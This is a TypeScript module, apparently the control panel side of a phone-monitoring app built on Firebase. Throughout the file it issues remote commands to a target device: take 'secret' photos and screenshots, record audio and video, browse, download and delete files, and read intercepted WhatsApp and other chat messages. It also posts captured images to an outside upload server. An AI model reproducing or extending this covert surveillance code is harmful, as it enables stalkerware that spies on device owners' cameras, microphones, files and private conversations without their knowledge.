import { ref, onValue, set, remove, limitToLast, query, push } from 'firebase/database';
import { collection, onSnapshot, doc, setDoc, deleteDoc } from 'firebase/firestore';
import { mediaFirestore, mediaRtdb, liveFirestore } from './firebaseConfig';

export interface PictureLogItem {
  id: string;
  date: string;
  info: string;
  path: string;
  previewUrl?: string | null;
  downloadUrl?: string | null;
  timestamp: number;
  name: string;
}

export interface CapturedPhotoItem {
  id: string;
  url: string;
  timestamp: number;
  type: string; // 'remote' or 'screenshot' or 'live'
}

export interface RecordedVideoItem {
  id: string;
  videoUrl: string;
  thumbnailUrl: string;
  duration: number;
  size: number;
  camera: string;
  timestamp: number;
}

export interface AudioRecordingItem {
  id: string;
  url: string;
  timestamp: number;
}

export interface FileExplorerItem {
  name: string;
  path: string;
  isDirectory: boolean;
  size: number;
  lastModified: number;
}

export interface InstantMessageItem {
  id: string;
  app: string;
  sender: string;
  message: string;
  direction: string;
  timestamp: number;
}

export const MediaRepository = {
  // Subscribe to pictures list (images saved on child storage)
  subscribePictureLogs(deviceId: string, onUpdate: (pictures: PictureLogItem[]) => void) {
    const picsCol = collection(mediaFirestore, 'devices', deviceId, 'pictures');
    return onSnapshot(picsCol, (snapshot) => {
      const pictures: PictureLogItem[] = [];
      snapshot.forEach((docSnap) => {
        const data = docSnap.data();
        const dateLong = data.date || 0;
        const dateStr = dateLong > 0 ? new Date(dateLong).toLocaleString() : '';
        const sizeMB = (data.size || 0) / (1024 * 1024);
        const name = data.name || (data.path ? data.path.split('/').pop() : 'Unknown');
        
        pictures.push({
          id: docSnap.id,
          date: dateStr,
          info: `${sizeMB.toFixed(1)} MB`,
          path: data.path || '',
          previewUrl: data.previewUrl || null,
          downloadUrl: data.downloadUrl || null,
          timestamp: dateLong,
          name: name
        });
      });
      // Sort descending by timestamp
      pictures.sort((a, b) => b.timestamp - a.timestamp);
      onUpdate(pictures);
    });
  },

  // Trigger picture preview fetch command
  async requestPicturePreview(deviceId: string, pictureId: string, path: string) {
    const cmdCol = collection(liveFirestore, 'devices', deviceId, 'commands'); // written to liveFirestore as commands collection
    const cmdId = crypto.randomUUID();
    const cmdDoc = doc(cmdCol, cmdId);
    await setDoc(cmdDoc, {
      id: cmdId,
      type: 'FETCH_PREVIEW',
      pictureId,
      path,
      status: 'pending',
      timestamp: Date.now()
    });
  },

  // Trigger full picture upload command
  async requestFullPicture(deviceId: string, pictureId: string, path: string) {
    const cmdCol = collection(liveFirestore, 'devices', deviceId, 'commands');
    const cmdId = crypto.randomUUID();
    const cmdDoc = doc(cmdCol, cmdId);
    await setDoc(cmdDoc, {
      id: cmdId,
      type: 'FETCH_FULL_IMAGE',
      pictureId,
      path,
      status: 'pending',
      timestamp: Date.now()
    });
  },

  // ==========================================
  // Captured Photos (Screenshots, Secret Photos)
  // ==========================================

  // Subscribe to captured photos list
  subscribeCapturedPhotos(deviceId: string, onUpdate: (photos: CapturedPhotoItem[]) => void) {
    const photosRef = ref(mediaRtdb, `devices/${deviceId}/capturedPhotos`);
    return onValue(photosRef, (snapshot) => {
      const photos: CapturedPhotoItem[] = [];
      snapshot.forEach((childSnap) => {
        const val = childSnap.val();
        photos.push({
          id: val.id || childSnap.key,
          url: val.url || '',
          timestamp: val.timestamp || 0,
          type: val.type || 'live'
        });
      });
      photos.sort((a, b) => b.timestamp - a.timestamp);
      onUpdate(photos);
    });
  },

  // Delete captured photo
  async deleteCapturedPhoto(deviceId: string, photoId: string) {
    await remove(ref(mediaRtdb, `devices/${deviceId}/capturedPhotos/${photoId}`));
  },

  // Trigger remote screenshot command
  async captureScreenshot(deviceId: string) {
    const cmdRef = ref(mediaRtdb, `commands/${deviceId}/screenshot`);
    await set(cmdRef, Date.now());
  },

  // Trigger secret photo command
  async captureSecretPhoto(deviceId: string) {
    const cmdRef = ref(mediaRtdb, `commands/${deviceId}/secretCapture`);
    await set(cmdRef, Date.now());
  },

  // ==========================================
  // Recorded Videos
  // ==========================================

  // Subscribe to video recordings list
  subscribeVideos(deviceId: string, onUpdate: (videos: RecordedVideoItem[]) => void) {
    const videosRef = ref(mediaRtdb, `devices/${deviceId}/videos`);
    return onValue(videosRef, (snapshot) => {
      const videos: RecordedVideoItem[] = [];
      snapshot.forEach((childSnap) => {
        const val = childSnap.val();
        videos.push({
          id: val.id || childSnap.key,
          videoUrl: val.videoUrl || '',
          thumbnailUrl: val.thumbnailUrl || '',
          duration: val.duration || 0,
          size: val.size || 0,
          camera: val.camera || 'rear',
          timestamp: val.timestamp || 0
        });
      });
      videos.sort((a, b) => b.timestamp - a.timestamp);
      onUpdate(videos);
    });
  },

  // Delete captured video
  async deleteVideo(deviceId: string, videoId: string) {
    await remove(ref(mediaRtdb, `devices/${deviceId}/videos/${videoId}`));
  },

  // Trigger remote video recording
  async startVideoRecording(deviceId: string, camera: 'rear' | 'front') {
    const cmdRef = ref(mediaRtdb, `commands/${deviceId}/videoRecording`);
    await set(cmdRef, {
      action: 'start',
      camera,
      timestamp: Date.now()
    });
  },

  // Stop remote video recording
  async stopVideoRecording(deviceId: string) {
    const cmdRef = ref(mediaRtdb, `commands/${deviceId}/videoRecording`);
    await set(cmdRef, {
      action: 'stop',
      timestamp: Date.now()
    });
  },

  // ==========================================
  // Audio Recordings
  // ==========================================

  // Subscribe to audio recordings list
  subscribeAudioRecordings(deviceId: string, onUpdate: (audios: AudioRecordingItem[]) => void) {
    const audiosRef = ref(mediaRtdb, `devices/${deviceId}/audioRecordings`);
    return onValue(audiosRef, (snapshot) => {
      const audios: AudioRecordingItem[] = [];
      snapshot.forEach((childSnap) => {
        const val = childSnap.val();
        audios.push({
          id: val.id || childSnap.key,
          url: val.url || '',
          timestamp: val.timestamp || 0
        });
      });
      audios.sort((a, b) => b.timestamp - a.timestamp);
      onUpdate(audios);
    });
  },

  // Delete audio recording
  async deleteAudioRecording(deviceId: string, audioId: string) {
    await remove(ref(mediaRtdb, `devices/${deviceId}/audioRecordings/${audioId}`));
  },

  // Trigger remote audio recording
  async startAudioRecording(deviceId: string) {
    const cmdRef = ref(mediaRtdb, `commands/${deviceId}/audioRecording`);
    await set(cmdRef, {
      action: 'start',
      timestamp: Date.now()
    });
  },

  // Stop remote audio recording
  async stopAudioRecording(deviceId: string) {
    const cmdRef = ref(mediaRtdb, `commands/${deviceId}/audioRecording`);
    await set(cmdRef, {
      action: 'stop',
      timestamp: Date.now()
    });
  },

  // ==========================================
  // File Explorer
  // ==========================================

  // Request directory contents
  async requestDirectory(deviceId: string, path: string) {
    const pathRef = ref(mediaRtdb, `commands/${deviceId}/fileExplorer/path`);
    await set(pathRef, path);
  },

  // Request file preview (thumbnail preview)
  async requestFilePreview(deviceId: string, filePath: string) {
    const previewRef = ref(mediaRtdb, `commands/${deviceId}/fileExplorer/previewRequest`);
    await set(previewRef, filePath);
  },

  // Request file download URL
  async requestFileDownload(deviceId: string, filePath: string) {
    const downloadRef = ref(mediaRtdb, `commands/${deviceId}/fileExplorer/downloadRequest`);
    await set(downloadRef, filePath);
  },

  // Request file deletion
  async requestFileDelete(deviceId: string, filePath: string) {
    const deleteRef = ref(mediaRtdb, `commands/${deviceId}/fileExplorer/deleteRequest`);
    await set(deleteRef, filePath);
  },

  // Clear explorer download status
  async clearExplorerDownload(deviceId: string) {
    const downloadRef = ref(mediaRtdb, `status/${deviceId}/fileExplorer/downloadUrl`);
    await set(downloadRef, null);
  },

  // Clear explorer preview status
  async clearExplorerPreview(deviceId: string) {
    const previewRef = ref(mediaRtdb, `status/${deviceId}/fileExplorer/previewData`);
    await set(previewRef, null);
  },

  // Subscribe to explorer directory listing response
  subscribeExplorerCurrentDir(deviceId: string, onUpdate: (dir: { path: string; error: string | null; items: FileExplorerItem[] }) => void) {
    const dirRef = ref(mediaRtdb, `status/${deviceId}/fileExplorer/currentDir`);
    return onValue(dirRef, (snapshot) => {
      if (snapshot.exists()) {
        const val = snapshot.val();
        const itemsVal = snapshot.child('items').val();
        const items: FileExplorerItem[] = [];
        if (itemsVal) {
          Object.values(itemsVal).forEach((child: any) => {
            items.push({
              name: child.name || '',
              path: child.path || '',
              isDirectory: child.isDirectory || false,
              size: child.size || 0,
              lastModified: child.lastModified || 0
            });
          });
        }
        onUpdate({
          path: val.path || '/storage/emulated/0',
          error: val.error || null,
          items
        });
      }
    });
  },

  // Subscribe to explorer preview response
  subscribeExplorerPreview(deviceId: string, onUpdate: (preview: any) => void) {
    const previewRef = ref(mediaRtdb, `status/${deviceId}/fileExplorer/previewData`);
    return onValue(previewRef, (snapshot) => {
      onUpdate(snapshot.exists() ? snapshot.val() : null);
    });
  },

  // Subscribe to explorer download response
  subscribeExplorerDownload(deviceId: string, onUpdate: (url: string) => void) {
    const downloadRef = ref(mediaRtdb, `status/${deviceId}/fileExplorer/downloadUrl/url`);
    return onValue(downloadRef, (snapshot) => {
      onUpdate(snapshot.val() || '');
    });
  },

  // ==========================================
  // Instant Messaging
  // ==========================================

  // Subscribe to social chat message logs
  subscribeInstantMessages(deviceId: string, onUpdate: (messages: InstantMessageItem[]) => void) {
    const messagesRef = ref(mediaRtdb, `instant_messaging/${deviceId}/messages`);
    const q = query(messagesRef, limitToLast(300));
    return onValue(q, (snapshot) => {
      const messages: InstantMessageItem[] = [];
      snapshot.forEach((childSnap) => {
        const val = childSnap.val();
        messages.push({
          id: childSnap.key || '',
          app: val.app || 'WhatsApp',
          sender: val.sender || '',
          message: val.message || '',
          direction: val.direction || 'incoming',
          timestamp: val.timestamp || 0
        });
      });
      messages.sort((a, b) => b.timestamp - a.timestamp);
      onUpdate(messages);
    });
  },

  // Subscribe to social chat app configuration
  subscribeInstantMessagingConfig(deviceId: string, onUpdate: (config: Record<string, boolean>) => void) {
    const configRef = ref(mediaRtdb, `instant_messaging/${deviceId}/config`);
    return onValue(configRef, (snapshot) => {
      if (snapshot.exists()) {
        onUpdate(snapshot.val());
      } else {
        onUpdate({});
      }
    });
  },

  // Save social chat app config toggle
  async updateInstantMessagingAppConfig(deviceId: string, appKey: string, isEnabled: boolean) {
    const refPath = ref(mediaRtdb, `instant_messaging/${deviceId}/config/${appKey}`);
    await set(refPath, isEnabled);
  },

  // Clear chat logs
  async clearInstantMessages(deviceId: string) {
    await remove(ref(mediaRtdb, `instant_messaging/${deviceId}/messages`));
  },

  // Upload photo captured from live camera stream
  async uploadCapturedPhoto(deviceId: string, blob: Blob) {
    const formData = new FormData();
    formData.append('file', blob, `capture_${Date.now()}.jpg`);

    const isLocalhost = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
    const uploadUrl = isLocalhost 
      ? '/api/upload_file.php' 
      : 'https://chiranjeevi.skillsupriselab.com/upload_file.php';

    const response = await fetch(uploadUrl, {
      method: 'POST',
      body: formData,
    });

    if (!response.ok) {
      throw new Error(`Upload failed with status ${response.status}`);
    }

    const text = await response.text();
    let parsedUrl = '';
    try {
      const data = JSON.parse(text);
      if (data && data.url) {
        parsedUrl = data.url;
      }
    } catch (e) {
      const match = text.match(/"url"\s*:\s*"([^"]+)"/);
      if (match) {
        parsedUrl = match[1].replace(/\\\//g, '/');
      }
    }

    if (!parsedUrl) {
      throw new Error(`Failed to parse uploaded photo URL from response: ${text}`);
    }

    const listRef = ref(mediaRtdb, `devices/${deviceId}/capturedPhotos`);
    const newPhotoRef = push(listRef);
    const photoId = newPhotoRef.key;
    if (!photoId) {
      throw new Error('Failed to generate key from Firebase Database.');
    }

    const photoData = {
      id: photoId,
      url: parsedUrl,
      timestamp: Date.now(),
      type: 'live'
    };

    await set(newPhotoRef, photoData);
    return photoData;
  },

  // Delete picture log from Firestore
  async deletePictureLog(deviceId: string, pictureId: string) {
    const docRef = doc(mediaFirestore, 'devices', deviceId, 'pictures', pictureId);
    await deleteDoc(docRef);
  }
};
